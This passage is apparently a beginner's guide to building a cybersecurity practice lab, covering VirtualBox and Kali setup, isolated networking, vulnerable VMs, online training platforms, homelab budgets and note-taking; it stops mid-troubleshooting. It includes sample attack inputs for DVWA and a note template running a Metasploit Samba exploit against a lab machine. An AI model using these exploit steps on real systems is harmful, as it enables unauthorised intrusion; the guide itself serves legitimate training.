
# Lab Setup & Practice Environments: Building Your Cybersecurity Playground

## 📋 Executive Summary

**Career Relevance**: ⭐⭐⭐⭐⭐ (95% - ESSENTIAL FOR LEARNING)

You can't become a cybersecurity professional by reading books alone. You need a **hands-on lab environment** to practice attacks, test tools, and break things safely. This is your personal hacking playground where mistakes are learning opportunities, not career-ending disasters.

**Why Labs Matter**:
- **OSCP Requirement**: You'll spend 200+ hours in PWK labs before the exam
- **Job Interviews**: "Show me your homelab" is a common interview question
- **Skill Development**: Reading about SQLi ≠ Exploiting SQLi
- **Portfolio Building**: Lab projects demonstrate real skills to employers
- **Safe Testing**: Break things without legal consequences or production outages

**What You'll Learn**:
1. Virtualization fundamentals (VirtualBox, VMware, Hyper-V)
2. Building a hacking lab (Kali Linux + vulnerable machines)
3. Network segmentation and isolation (protect your home network!)
4. Popular practice platforms (HTB, TryHackMe, VulnHub)
5. Cloud labs (AWS, Azure for enterprise practice)
6. Budget-friendly homelab builds ($0 to $2,000+)
7. OSCP-specific lab preparation
8. Troubleshooting common issues
9. Lab documentation and note-taking
10. Scaling your lab as you grow

**Investment**:
- **Time**: 8-20 hours for initial setup
- **Money**: $0 (free options) to $2,000+ (professional homelab)
- **Hardware**: Modern laptop (8GB RAM minimum, 16GB+ recommended)

**Bottom Line**: Your lab is your gym. You wouldn't expect to get fit by reading about exercise—same with hacking.

---

## 🎓 ABSOLUTE BEGINNER: What is a Practice Lab?

### The Flight Simulator Analogy

Imagine learning to fly an airplane:

**Option 1: Read a Book** 📚
```
You: "I read 'How to Fly a Boeing 747' cover to cover!"
Airline: "Great! Here are the keys to a plane with 300 passengers."
You: "Wait, what? I've never actually flown anything!"
→ DISASTER
```

**Option 2: Flight Simulator** ✈️
```
You: "I practiced in a simulator for 200 hours."
Instructor: "Show me a landing."
You: *Successfully lands (after crashing 50 times in the simulator)*
Instructor: "Now you're ready for the real plane."
→ SUCCESS
```

**Cybersecurity Labs = Flight Simulators**:
- Practice attacks without breaking real systems
- Learn from mistakes in a safe environment
- Build muscle memory for tools and techniques
- Demonstrate skills to employers

### What is a Virtual Machine?

**The Apartment Building Analogy**:

```
Your Physical Computer (Building):
├─ Host OS: Windows 10 (Lobby/Foundation)
├─ VirtualBox (Apartment Manager)
│  ├─ VM 1: Kali Linux (Apartment 1)
│  ├─ VM 2: Windows Server 2019 (Apartment 2)
│  ├─ VM 3: Ubuntu Web Server (Apartment 3)
│  └─ VM 4: Metasploitable (Apartment 4 - Intentionally Broken)
└─ Each VM thinks it's a separate computer!
```

**Key Concepts**:
- **Host OS**: Your actual operating system (Windows, macOS, Linux)
- **Guest OS**: Operating system running inside a VM
- **Hypervisor**: Software that manages VMs (VirtualBox, VMware)
- **Snapshot**: Save point (like video game save) - restore if you break something
- **Network Modes**: How VMs communicate (NAT, Bridged, Host-Only)

---

## 💻 PART 1: CHOOSING YOUR VIRTUALIZATION PLATFORM

### Comparison Table

| Platform | Cost | OS Support | Performance | Ease of Use | Best For |
|----------|------|------------|-------------|-------------|----------|
| **VirtualBox** | Free | Win/Mac/Linux | Good | ⭐⭐⭐⭐⭐ Easy | Beginners, students, free labs |
| **VMware Workstation** | $199 (Pro) / Free (Player) | Win/Linux | Excellent | ⭐⭐⭐⭐ | Professionals, better performance |
| **VMware Fusion** | $199 / Free (Player) | macOS | Excellent | ⭐⭐⭐⭐ | Mac users |
| **Hyper-V** | Free (Windows Pro) | Windows only | Excellent | ⭐⭐⭐ | Windows Pro/Enterprise users |
| **Proxmox** | Free | Linux (bare metal) | Excellent | ⭐⭐ Advanced | Dedicated lab server |
| **Cloud (AWS/Azure)** | Pay-as-you-go | Any | Excellent | ⭐⭐⭐⭐ | Enterprise practice, team labs |

**Recommendation for Beginners**: Start with **VirtualBox** (free, cross-platform, simple).

---

## 🛠️ PART 2: BUILDING YOUR FIRST LAB (STEP-BY-STEP)

### Hardware Requirements

**Minimum** (Can learn, but painful):
```
CPU: Dual-core (Intel i3 or equivalent)
RAM: 8GB
Storage: 100GB free space
OS: Windows 10, macOS 10.13+, or Linux
```

**Recommended** (Smooth experience):
```
CPU: Quad-core (Intel i5/Ryzen 5 or better)
RAM: 16GB (32GB ideal)
Storage: 256GB+ SSD
OS: Windows 10/11, macOS, or Ubuntu
```

**Optimal** (Professional lab):
```
CPU: 6-8 core (Intel i7/Ryzen 7 or better)
RAM: 32GB+ (64GB for large labs)
Storage: 512GB+ NVMe SSD
OS: Any modern OS
Optional: Dedicated lab server (old PC repurposed)
```

**RAM Allocation Guide**:
```
8GB Total:
├─ Host OS: 2GB
├─ Kali Linux: 4GB
└─ 1 Vulnerable VM: 2GB
→ Can run 1-2 VMs at a time

16GB Total:
├─ Host OS: 4GB
├─ Kali Linux: 4GB
├─ Windows Target: 4GB
└─ Linux Target: 2GB
→ Can run 3-4 VMs comfortably

32GB Total:
├─ Host OS: 4GB
├─ Kali Linux: 8GB
├─ Active Directory Lab: 16GB (3-4 VMs)
└─ Spare: 4GB
→ Can run enterprise labs
```

---

### Installation Guide: VirtualBox + Kali Linux

**Step 1: Download VirtualBox** (10 minutes)

```
1. Visit: https://www.virtualbox.org/wiki/Downloads
2. Download for your OS:
   - Windows hosts
   - macOS hosts  
   - Linux distributions

3. Install VirtualBox:
   Windows: Run installer → Next → Next → Install
   macOS: Open .dmg → Drag to Applications
   Linux: sudo apt install virtualbox

4. Download Extension Pack (enables USB 3.0, encryption, etc.)
   - Same download page
   - Double-click to install after VirtualBox is installed
```

**Step 2: Download Kali Linux** (30 minutes - large file)

```
1. Visit: https://www.kali.org/get-kali/

2. Choose download type:
   
   Option A: Pre-built VirtualBox Image (EASIEST)
   ✅ Recommended for beginners
   • Download "VirtualBox" 64-bit
   • File: ~3.5GB .ova file
   • Import directly into VirtualBox
   
   Option B: ISO Image (More control)
   • Download "Installer Images"
   • File: ~4GB .iso file
   • Requires manual VM creation and OS installation

3. Verify checksum (optional but recommended):
   sha256sum kali-linux-*-virtualbox-amd64.ova
   # Compare with checksum on download page
```

**Step 3: Import Kali Linux into VirtualBox** (5 minutes)

```
Option A: Pre-built Image (Easiest)
─────────────────────────────────────────────────────────
1. Open VirtualBox
2. File → Import Appliance
3. Select downloaded .ova file
4. Click "Import" (wait 2-5 minutes)
5. Done! Kali VM is ready.

Default credentials:
Username: kali
Password: kali

Option B: Manual Installation from ISO
─────────────────────────────────────────────────────────
1. VirtualBox → New
2. Name: Kali Linux
   Type: Linux
   Version: Debian (64-bit)
   
3. RAM: 4096 MB (4GB) minimum
4. Hard disk: Create virtual hard disk (50GB+)
5. Settings → Storage → Add .iso file to optical drive
6. Start VM → Follow Kali installation wizard
7. Install GRUB bootloader → Reboot
8. Login with credentials you created
```

**Step 4: Initial Kali Configuration** (15 minutes)

```bash
# ═══════════════════════════════════════════════════════════
# AFTER FIRST LOGIN
# ═══════════════════════════════════════════════════════════

# 1. Update system
sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y

# 2. Install VirtualBox Guest Additions (better performance)
# Top menu: Devices → Insert Guest Additions CD image
sudo apt install -y virtualbox-guest-x11
sudo reboot

# 3. Create snapshots directory
mkdir -p ~/Documents/OSCP/{scans,exploits,notes,screenshots}

# 4. Install essential tools (if not already included)
sudo apt install -y \
    tmux \
    gobuster \
    enum4linux \
    seclists \
    python3-pip \
    git \
    curl \
    wget

# 5. Take your first snapshot!
# VirtualBox Menu: Machine → Take Snapshot
# Name: "Fresh Install - Fully Updated"
# Description: "Clean Kali installation with updates"
```

**Step 5: Network Configuration** (10 minutes)

```
VirtualBox Network Modes Explained:

NAT (Default):
├─ VM can access internet
├─ VM CANNOT be accessed from host
├─ Multiple VMs can't talk to each other
└─ Use for: Basic browsing, updates

NAT Network:
├─ VM can access internet
├─ Multiple VMs can talk to each other
├─ VM CANNOT be accessed from host (without port forwarding)
└─ Use for: Isolated lab network

Bridged:
├─ VM gets IP from your home router
├─ VM is on same network as host
├─ DANGER: VM is exposed to home network
└─ Use for: Testing against physical devices (use carefully!)

Host-Only:
├─ VM can ONLY talk to host and other VMs
├─ VM CANNOT access internet
├─ Isolated from home network (SAFEST)
└─ Use for: Vulnerable VMs, malware analysis

Internal:
├─ VMs can talk to each other
├─ VM cannot access host or internet
└─ Use for: Isolated multi-VM labs
```

**Recommended Setup for OSCP Lab**:

```
Kali Linux VM:
├─ Adapter 1: NAT (for internet access, updates)
└─ Adapter 2: Host-Only (for attacking vulnerable VMs)

Vulnerable VMs:
└─ Adapter 1: Host-Only (isolated from internet)

Why this setup?
✅ Kali can update and access internet
✅ Kali can attack vulnerable VMs via Host-Only network
✅ Vulnerable VMs are isolated (can't attack your home network)
✅ Safe and practical
```

**Configure Host-Only Network**:

```
1. VirtualBox → File → Host Network Manager
2. Click "Create"
3. Note the network name: "vboxnet0"
4. Configure:
   IPv4 Address: 192.168.56.1
   Subnet Mask: 255.255.255.0
   DHCP: Enabled
   
5. For each VM:
   Settings → Network → Adapter 2
   Enable: Yes
   Attached to: Host-only Adapter
   Name: vboxnet0
```

---

## 🎯 PART 3: VULNERABLE MACHINES FOR PRACTICE

### VulnHub (Free Vulnerable VMs)

**What is VulnHub?**
- Repository of intentionally vulnerable VMs
- Download → Import → Hack
- Hundreds of machines (beginner to expert)
- Free and legal to practice on

**Top 10 Beginner-Friendly VulnHub Machines**:

```
1. OSCP-Like (Start Here):
   ├─ Kioptrix Level 1 (Very Easy)
   ├─ Mr. Robot (Fun, beginner-friendly)
   ├─ Stapler (Easy)
   └─ Basic Pentesting 1 & 2

2. Web Application Focus:
   ├─ bWAPP (Web vulnerability lab)
   ├─ DVWA (Damn Vulnerable Web App)
   └─ WebGoat (OWASP training platform)

3. Privilege Escalation Practice:
   ├─ Lin.Security (Linux PrivEsc)
   ├─ Brainpan (Buffer overflow)
   └─ Metasploitable 2 & 3 (Multi-vuln)

Download: https://www.vulnhub.com/
```

**How to Use VulnHub VMs**:

```bash
# ═══════════════════════════════════════════════════════════
# STEP 1: DOWNLOAD VM
# ═══════════════════════════════════════════════════════════
# Visit vulnhub.com → Browse machines → Download .ova or .vmdk

# ═══════════════════════════════════════════════════════════
# STEP 2: IMPORT INTO VIRTUALBOX
# ═══════════════════════════════════════════════════════════
# VirtualBox → File → Import Appliance
# Select downloaded .ova file
# Settings → Network → Host-Only Adapter

# ═══════════════════════════════════════════════════════════
# STEP 3: DISCOVER VM IP
# ═══════════════════════════════════════════════════════════
# From Kali Linux:
sudo netdiscover -r 192.168.56.0/24
# OR
sudo nmap -sn 192.168.56.0/24

# Look for new IP that appeared

# ═══════════════════════════════════════════════════════════
# STEP 4: START HACKING!
# ═══════════════════════════════════════════════════════════
nmap -sV -sC -p- 192.168.56.101
# Enumerate → Exploit → Escalate → Root!
```

---

### Metasploitable 2 & 3 (Multi-Vulnerability Lab)

**Metasploitable 2** (Most Popular):

```
What: Intentionally vulnerable Ubuntu Linux
Vulnerabilities: 30+ exploitable services
Difficulty: Easy (perfect for absolute beginners)
Size: ~800MB

Vulnerable Services:
├─ FTP: vsftpd 2.3.4 (backdoor)
├─ SSH: Weak credentials
├─ Telnet: Unencrypted, weak passwords
├─ HTTP: Multiple web app vulns
├─ SMB: Samba exploits
├─ MySQL: No root password
├─ PostgreSQL: Weak credentials
├─ VNC: No authentication
└─ Tomcat: Default credentials

Download: 
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Setup:
1. Extract .zip file
2. VirtualBox → New → Use existing hard disk
3. Select extracted .vmdk file
4. Network: Host-Only Adapter
5. Start VM

Default Credentials:
Username: msfadmin
Password: msfadmin

First Steps:
# From Kali:
nmap -sV 192.168.56.102
# Try exploiting vsftpd backdoor, Samba, etc.
```

**Metasploitable 3** (Advanced):

```
What: Windows Server 2008 & Ubuntu VMs
Vulnerabilities: Modern exploit scenarios
Difficulty: Medium
Setup: More complex (uses Vagrant)

Better for:
├─ After mastering Metasploitable 2
├─ Windows exploitation practice
├─ Active Directory basics
└─ Modern vulnerability types

Download & Setup:
https://github.com/rapid7/metasploitable3
```

---

### DVWA (Damn Vulnerable Web Application)

**What it is**:
- PHP/MySQL web application
- Intentionally vulnerable to OWASP Top 10
- Adjustable difficulty levels (Low, Medium, High, Impossible)
- Perfect for learning web app attacks

**Setup (Multiple Options)**:

```bash
# ═══════════════════════════════════════════════════════════
# OPTION 1: Docker (Easiest)
# ═══════════════════════════════════════════════════════════
sudo apt install docker.io
sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Access: http://localhost
# Default: admin / password

# ═══════════════════════════════════════════════════════════
# OPTION 2: Manual Installation on Kali
# ═══════════════════════════════════════════════════════════
sudo apt install apache2 php php-mysqli mysql-server git

cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chmod -R 777 DVWA

# Configure database
sudo mysql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa';
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';
exit;

# Edit config
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php
# Set: db_user = 'dvwa', db_password = 'dvwa'

# Access: http://localhost/DVWA
# Click "Create/Reset Database"
# Login: admin / password

# ═══════════════════════════════════════════════════════════
# OPTION 3: Download Pre-built VM
# ═══════════════════════════════════════════════════════════
# Search VulnHub for "DVWA" - pre-configured VMs available
```

**Practice Path**:

```
Day 1: Set difficulty to LOW
├─ SQL Injection (basic payloads)
├─ XSS Reflected (simple <script>alert('XSS')</script>)
├─ Command Injection (test with ; ls)
└─ File Upload (upload PHP webshell)

Week 2: Increase to MEDIUM
├─ Bypass basic filters
├─ Try encoding (URL encoding, base64)
├─ Use more sophisticated payloads

Month 2: Try HIGH difficulty
├─ Advanced filter bypasses
├─ Creative exploitation techniques

Eventually: Study IMPOSSIBLE code
└─ Learn how to properly secure web apps
```

---

## 🌐 PART 4: ONLINE PRACTICE PLATFORMS

### HackTheBox (HTB)

**What it is**:
- Online penetration testing labs
- 200+ retired machines + 20+ active machines
- Realistic, challenging scenarios
- Competitive leaderboard

**Pricing**:
```
Free Tier:
├─ Access to 1-2 active machines (rotating)
├─ Cannot access retired machines
├─ Community forums
└─ Good for: Testing if you like HTB

VIP Subscription ($20/month):
├─ All retired machines (200+)
├─ All active machines (20+)
├─ VIP-only machines
├─ Exclusive challenges
└─ Recommended for: OSCP preparation

VIP+ ($27/month):
└─ Faster server performance (worth it if laggy)
```

**Getting Started**:

```bash
# ═══════════════════════════════════════════════════════════
# STEP 1: CREATE ACCOUNT
# ═══════════════════════════════════════════════════════════
# Visit: https://www.hackthebox.com/
# Click "Join" → Complete invite challenge (tests basic skills)

# ═══════════════════════════════════════════════════════════
# STEP 2: DOWNLOAD VPN CONFIG
# ═══════════════════════════════════════════════════════════
# Dashboard → Connect to HTB → Download .ovpn file

# ═══════════════════════════════════════════════════════════
# STEP 3: CONNECT FROM KALI
# ═══════════════════════════════════════════════════════════
sudo openvpn ~/Downloads/lab_username.ovpn

# Wait for "Initialization Sequence Completed"
# You're now connected to HTB network!

# ═══════════════════════════════════════════════════════════
# STEP 4: SPAWN MACHINE & ATTACK
# ═══════════════════════════════════════════════════════════
# HTB Website → Machines → Click machine → "Spawn Machine"
# Wait for IP address to appear (e.g., 10.10.10.5)

# From Kali:
nmap -sV -sC 10.10.10.5
# Enumerate → Exploit → Get flags!
```

**HTB Machine Difficulty Guide**:

```
Easy (20 points):
├─ Clear exploitation path
├─ Well-known vulnerabilities
├─ Good for: Beginners, OSCP practice
└─ Time: 2-6 hours

Medium (30 points):
├─ Some enumeration required
├─ Chain of exploits
├─ Good for: OSCP exam prep
└─ Time: 4-12 hours

Hard (40 points):
├─ Deep enumeration
├─ Creative thinking required
├─ Good for: Advanced skills
└─ Time: 8-24 hours

Insane (50 points):
├─ Multi-stage attacks
├─ Custom exploit development
├─ Good for: CTF champions, bragging rights
└─ Time: 12-72 hours
```

**OSCP Preparation (TJ Null's List)**:

```
Recommended HTB Machines for OSCP (Start Here):

Linux Easy:
├─ Lame
├─ Legacy
├─ Beep
├─ Shocker
└─ Bashed

Linux Medium:
├─ Poison
├─ Sunday
├─ Tartarsauce
└─ Irked

Windows Easy:
├─ Devel
├─ Blue
├─ Jerry
└─ Optimum

Windows Medium:
├─ Bastard
├─ Bounty
├─ Arctic
└─ Granny

Active Directory:
├─ Forest (Medium)
├─ Sauna (Easy)
└─ Cascade (Medium)

Full TJ Null list: 
https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/
```

**HTB Learning Path**:

```
Month 1: Easy Machines (5-10 machines)
└─ Build confidence, learn methodology

Month 2-3: Medium Machines (10-15 machines)
└─ OSCP difficulty, complex chains

Month 4: Mix of Medium/Hard + Active Directory
└─ Advanced techniques, AD basics

Month 5-6: Exam Simulation
└─ TJ Null's OSCP list (40 machines)
└─ Practice report writing

Result: Ready for OSCP exam!
```

---

### TryHackMe (THM)

**What it is**:
- Beginner-friendly learning platform
- Guided rooms (tutorials + challenges)
- Less competitive, more educational
- Browser-based VMs (no VPN needed for many rooms)

**Pricing**:
```
Free Tier:
├─ 60% of content
├─ Some learning paths
├─ Community rooms
└─ Good for: Complete beginners

Premium ($10/month):
├─ All content (1000+ rooms)
├─ Complete learning paths
├─ Certificates of completion
├─ No ads
└─ Recommended for: Structured learning
```

**Learning Paths**:

```
Complete Beginner Path (FREE):
├─ Linux Fundamentals
├─ Network Fundamentals
├─ Web Application Basics
├─ Scripting Basics
└─ Time: 40 hours

Offensive Pentesting (Premium):
├─ Network Security
├─ Web Hacking
├─ Privilege Escalation
├─ Metasploit
└─ Time: 80 hours (perfect OSCP prep)

Cyber Defense (Premium):
├─ Threat Intelligence
├─ Digital Forensics
├─ SIEM
├─ Incident Response
└─ Time: 60 hours

Web Fundamentals (Premium):
├─ OWASP Top 10
├─ Burp Suite
├─ SQL Injection Deep Dive
└─ Time: 40 hours
```

**THM vs HTB Comparison**:

| Aspect | TryHackMe | HackTheBox |
|--------|-----------|------------|
| **Difficulty** | Beginner-friendly | Intermediate-Advanced |
| **Guidance** | Step-by-step tutorials | Minimal hints |
| **Cost** | $10/month | $20/month (VIP) |
| **OSCP Prep** | Good for fundamentals | Better for exam simulation |
| **Best For** | Absolute beginners | OSCP candidates, CTF players |

**Recommendation**: Start with TryHackMe for 1-2 months, then move to HackTheBox for OSCP prep.

---

### Proving Grounds (OffSec Official)

**What it is**:
- Official Offensive Security practice platform
- Retired OSCP-like machines
- Same difficulty as real OSCP exam
- Best exam preparation available

**Pricing**:
```
Proving Grounds Play (Free):
├─ Limited machines
├─ Good for sampling

Proving Grounds Practice ($20/month):
├─ 50+ OSCP-like machines
├─ Closest to real exam difficulty
├─ Official walkthroughs
└─ HIGHLY RECOMMENDED for OSCP prep
```

**Why PG Practice is Worth It**:
```
✅ Created by OffSec (knows exactly what's on exam)
✅ Machines retired from actual OSCP labs
✅ Exact exam difficulty and format
✅ Practice report writing
✅ Walkthroughs teach OffSec methodology

Timeline:
2 months before OSCP exam → Subscribe
Complete 30+ PG machines → Ready for exam
```

---

## 🏢 PART 5: CLOUD LABS (AWS/Azure)

### Why Cloud Labs?

**Benefits**:
- No hardware limitations (scale up RAM/CPU as needed)
- Access from anywhere (laptop, tablet, work computer)
- Practice enterprise environments (Active Directory, cloud security)
- Employer-relevant skills (cloud is 80% of enterprise infrastructure)

**Drawbacks**:
- Costs money (can add up if not careful)
- Requires credit card
- Data egress fees (uploading/downloading large files)

---

### AWS Free Tier Lab Setup

**What's Free**:
- 750 hours/month of t2.micro instances (first 12 months)
- 30GB storage
- Perfect for: Basic Linux/Windows practice

**Setup Guide**:

```
1. Create AWS Account
   ├─ Visit: https://aws.amazon.com/free/
   ├─ Sign up (requires credit card)
   └─ Enable MFA on root account (security!)

2. Launch Kali Linux Instance
   ├─ EC2 Dashboard → Launch Instance
   ├─ Search AMI Marketplace: "Kali Linux"
   ├─ Instance Type: t2.micro (free tier)
   ├─ Configure Security Group:
   │  └─ SSH (port 22) from My IP only
   ├─ Create Key Pair (download .pem file)
   └─ Launch

3. Connect via SSH
   chmod 400 your-key.pem
   ssh -i your-key.pem kali@<instance-public-ip>

4. Setup VNC (GUI Access)
   # On instance:
   sudo apt update && sudo apt install tightvncserver
   vncserver :1
   
   # Create SSH tunnel from your laptop:
   ssh -L 5901:localhost:5901 -i your-key.pem kali@<instance-ip>
   
   # Connect VNC client to localhost:5901

5. IMPORTANT: Stop instance when done!
   └─ Running 24/7 = Exceeds free tier = $$$
```

**Cost Monitoring**:
```
✅ Set up billing alerts:
   AWS Console → Billing → Budgets → Create Budget
   Alert when charges exceed $5

✅ Always stop instances when not in use:
   EC2 Dashboard → Instances → Right-click → Stop

❌ DON'T leave instances running overnight
❌ DON'T use expensive instance types (t2.micro only for practice)
```

---

## 💰 PART 6: BUDGET-FRIENDLY HOMELAB BUILDS

### Build 1: $0 Budget (Laptop Only)

**Hardware**: Your existing laptop
**Cost**: $0 (use what you have)

**Setup**:
```
Laptop Specs: 8GB RAM, Dual-core CPU
├─ VirtualBox (Free)
├─ Kali Linux VM (4GB RAM)
├─ 1 Vulnerable VM at a time (2GB RAM)
└─ Practice: VulnHub, DVWA, Metasploitable

Limitations:
├─ Can't run multiple VMs simultaneously
├─ No Active Directory labs (need 16GB+ RAM)
└─ Slower performance

Good For:
└─ Absolute beginners learning basics
```

---

### Build 2: $300 Budget (Upgrade RAM)

**Hardware**: Laptop + RAM upgrade
**Cost**: $50-$100 (RAM upgrade to 16GB)

**Setup**:
```
Laptop Specs: 16GB RAM, Quad-core CPU
├─ VirtualBox (Free)
├─ Kali Linux VM (4GB RAM)
├─ 2-3 Vulnerable VMs (2-4GB each)
└─ Can run small AD labs

Limitations:
└─ Still limited by laptop performance

Good For:
└─ OSCP preparation, most labs
```

---

### Build 3: $500-800 Budget (Dedicated Server)

**Hardware**: Refurbished Dell/HP Server or gaming PC
**Cost**: $300-$600

**Example Build**:
```
Option A: Refurbished Office PC
├─ Dell Optiplex 7040
├─ Intel i7-6700 (4 cores, 8 threads)
├─ 32GB RAM (upgrade from 8GB, +$100)
├─ 512GB SSD
└─ Total: ~$400

Option B: Build Your Own
├─ Ryzen 5 3600 CPU: $120
├─ 32GB RAM: $80
├─ 500GB SSD: $50
├─ Motherboard: $80
├─ Case + PSU: $70
└─ Total: ~$400

Software (Free):
└─ Proxmox VE (bare-metal hypervisor)
   └─ Run 10+ VMs simultaneously

Good For:
└─ Large labs, Active Directory, team practice
```

---

### Build 4: $1000-2000 Budget (Professional Homelab)

**Hardware**: High-end server
**Cost**: $1000-$2000

**Example Build**:
```
Dedicated Server:
├─ AMD Ryzen 9 5900X (12 cores, 24 threads): $400
├─ 64GB RAM (2x32GB): $200
├─ 1TB NVMe SSD: $100
├─ 2TB HDD (bulk storage): $50
├─ Motherboard: $150
├─ Case + PSU: $100
└─ Total: ~$1000

Advanced Features:
├─ Proxmox with clustering
├─ PfSense virtual firewall
├─ Multiple network segments
├─ Replicate enterprise environments
└─ Run 20+ VMs simultaneously

Optional Additions:
├─ Managed switch: $100-$300
├─ Raspberry Pi (monitoring): $50
└─ UPS (power backup): $100

Good For:
└─ Professional certifications, red team training, content creation
```

---

## 🔧 PART 7: NETWORK ARCHITECTURE (ADVANCED)

### Basic Lab Network (Single Host)

```
┌──────────────────────────────────────────────────────────┐
│                 HOST COMPUTER (You)                      │
│  ┌────────────────────────────────────────────────────┐  │
│  │              VirtualBox/VMware                     │  │
│  │                                                    │  │
│  │  ┌────────────┐  ┌────────────┐  ┌────────────┐  │  │
│  │  │  Kali      │  │ Metaspl.   │  │  DVWA      │  │  │
│  │  │  Linux     │  │    2       │  │   VM       │  │  │
│  │  │  (Attacker)│  │  (Victim)  │  │  (Victim)  │  │  │
│  │  └─────┬──────┘  └─────┬──────┘  └─────┬──────┘  │  │
│  │        │                │                │         │  │
│  │        └────────────────┴────────────────┘         │  │
│  │                 Host-Only Network                  │  │
│  │                  (192.168.56.0/24)                 │  │
│  └────────────────────────────────────────────────────┘  │
│                          │                               │
│                    NAT (Internet)                         │
└──────────────────────────┴───────────────────────────────┘
                           │
                      [Internet]
```

---

### Advanced Lab (Active Directory Simulation)

```
┌────────────────────────────────────────────────────────────┐
│               ENTERPRISE LAB NETWORK                       │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Internet Zone (NAT - 10.0.0.0/24)                         │
│  ┌──────────────┐                                          │
│  │ Kali Linux   │  (Attacker from "outside")               │
│  │ 10.0.0.100   │                                          │
│  └──────┬───────┘                                          │
│         │                                                  │
│         ▼                                                  │
│  DMZ Zone (192.168.1.0/24)                                 │
│  ┌──────────────┐  ┌──────────────┐                       │
│  │ Web Server   │  │  Email Server│                       │
│  │ IIS 8.5      │  │  Exchange    │                       │
│  │ .1.10        │  │  .1.20       │                       │
│  └──────┬───────┘  └──────┬───────┘                       │
│         │                  │                               │
│         ▼                  ▼                               │
│  Internal Zone (192.168.10.0/24)                           │
│  ┌─────────────────────────────────────────┐              │
│  │         Active Directory Lab            │              │
│  │  ┌─────────────┐  ┌─────────────┐       │              │
│  │  │ Domain      │  │ File Server │       │              │
│  │  │ Controller  │  │ SMB Shares  │       │              │
│  │  │ DC01        │  │ FS01        │       │              │
│  │  │ .10.1       │  │ .10.20      │       │              │
│  │  └─────────────┘  └─────────────┘       │              │
│  │                                          │              │
│  │  ┌─────────────┐  ┌─────────────┐       │              │
│  │  │ Workstation │  │ Workstation │       │              │
│  │  │ Win10-01    │  │ Win10-02    │       │              │
│  │  │ .10.50      │  │ .10.51      │       │              │
│  │  └─────────────┘  └─────────────┘       │              │
│  └─────────────────────────────────────────┘              │
│                                                            │
│  Firewall (PfSense VM):                                    │
│  ├─ WAN: 10.0.0.1 (NAT)                                    │
│  ├─ DMZ: 192.168.1.1                                       │
│  └─ LAN: 192.168.10.1                                      │
└────────────────────────────────────────────────────────────┘
```

**This teaches**:
- Network segmentation
- Firewall rules
- Lateral movement
- Domain controller attacks
- Enterprise pentesting

---

## 📝 PART 8: LAB DOCUMENTATION & NOTE-TAKING

### Essential Tools

**1. CherryTree (Free, Cross-Platform)**
```
Perfect for: Hierarchical notes, screenshots, code snippets
Download: https://www.giuspen.com/cherrytree/

Recommended Structure:
└─ OSCP Labs
   ├─ Methodology
   ├─ Cheat Sheets
   └─ Machines
      ├─ 10.10.10.5 - Lame
      │  ├─ Enumeration
      │  ├─ Exploitation
      │  ├─ Privilege Escalation
      │  └─ Lessons Learned
      └─ [Next machine...]
```

**2. Obsidian (Free, Markdown-based)**
```
Perfect for: Linked notes, knowledge graphs
Download: https://obsidian.md/

Features:
├─ Bidirectional links
├─ Graph view (visualize connections)
├─ Plugins (calendar, templates)
└─ Sync across devices (paid)
```

**3. Joplin (Free, Open-Source)**
```
Perfect for: Encrypted notes, syncing
Download: https://joplinapp.org/

Features:
├─ End-to-end encryption
├─ Markdown support
├─ Mobile apps
└─ Cloud sync (Dropbox, OneDrive)
```

---

### Note-Taking Template

```markdown
# Machine Name: [Lame]
**IP**: 10.10.10.5
**OS**: Linux (Ubuntu 8.04)
**Difficulty**: Easy
**Date**: 2024-01-25

## Enumeration

### Nmap Scan
```bash
nmap -sV -sC -p- 10.10.10.5 -oN nmap/full.txt

Results:
- 21/tcp FTP vsftpd 2.3.4 (VULNERABLE)
- 22/tcp SSH OpenSSH 4.7
- 139/tcp SMB Samba 3.0.20
- 445/tcp SMB Samba 3.0.20
```

### Service-Specific Enumeration
```bash
# SMB Enumeration
smbclient -L //10.10.10.5/ -N
enum4linux -a 10.10.10.5

Findings:
- Samba 3.0.20 (known vuln: CVE-2007-2447)
```

## Exploitation

### Vulnerability: Samba 3.0.20 Command Execution
```bash
searchsploit samba 3.0.20
# Found: usermap_script exploit

msfconsole
use exploit/multi/samba/usermap_script
set RHOST 10.10.10.5
exploit

[+] Shell obtained as root!
```

## Post-Exploitation

### Flags
- User flag: /home/makis/user.txt
  - `69454a937d94f5f0225ea00acd2e84c5`
- Root flag: /root/root.txt
  - `92caac3be140ef409e45721348a4e9df`

### Privilege Escalation
- N/A (already root from exploit)

## Lessons Learned
1. Always check for outdated service versions
2. Samba has history of RCE vulnerabilities
3. Metasploit had ready exploit (but know manual method too)

## Screenshots
[Insert screenshots here]

## References
- https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script
- CVE-2007-2447
```

---

## 🚨 PART 9: COMMON LAB ISSUES & TROUBLESHOOTING

### Issue 1: "VT-x is not available" Error

**Problem**: Can't start 64-bit VMs

**Solution**:
```
Cause: Virtualization disabled in BIOS

Fix:
1. Restart computer
2. Enter BIOS (usually F2, F12, or DEL during boot)
3. Find "Virtualization Technology" or "Intel VT-x" / "AMD-V"
4. Enable it
5. Save and exit

Windows-specific:
- Also disable Hyper-V if enabled:
  Control Panel → Programs → Turn Windows features on/off
  → Uncheck "Hyper-V"
```

---

### Issue 2: "No Internet in VM"

**Problem**: Can browse internet on host, but not in VM

**Solution**:
```
Check Network Adapter:
VM Settings → Network → Adapter 1 → NAT

Test from VM:
ping 8.8.8.8  # Test connectivity
ping google.com  # Test DNS

If ping 8.8.8.8 works but ping google.com fails:
└─ DNS issue
   Solution: Edit /etc/resolv.conf
   Add: nameserver 8.8.8.8

If both fail:
└─ Adapter issue
   Solution:
   1. VM Settings → Network → Attached to: NAT
   2. Advanced → Adapter Type: PCnet-PCI II
   3. Restart VM
```

---

### Issue 3: "VMs Can't See Each Other"

**Problem**: Kali can't reach vulnerable VM on Host-Only network

**Solution**:
```
1. Check both VMs have Host-Only adapter enabled
   - VM Settings → Network → Adapter 2 → Host-only Adapter

2. Check IP addresses are on same subnet:
   # Kali:
   ip addr show
